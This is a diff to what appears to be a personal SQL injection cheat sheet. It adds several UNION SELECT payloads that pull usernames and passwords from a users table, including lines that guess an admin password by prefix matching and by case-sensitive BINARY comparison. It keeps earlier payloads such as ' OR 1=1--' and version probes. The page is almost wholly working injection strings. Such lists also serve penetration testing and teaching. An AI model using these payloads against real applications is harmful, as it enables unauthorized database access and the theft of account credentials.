@@ -13,7 +13,7 @@ render_with_liquid: false
 
 <br />
 
-## URL parameter
+## Examples
 
 ```html
 ' OR 1=1--
@@ -27,6 +27,11 @@ render_with_liquid: false
 ' UNION SELECT username,password FROM users--
 ' UNION SELECT username || '~' || password FROM users--
 ' UNION SELECT NULL,username || '~' || password FROM users--
+' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'--
+' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'--
+' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'--
+<!-- BINARY: sensive to upper_case and lower_case -->
+' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'--
 
 <!-- MySQL, Microsoft  -->
 ' UNION SELECT @@version--
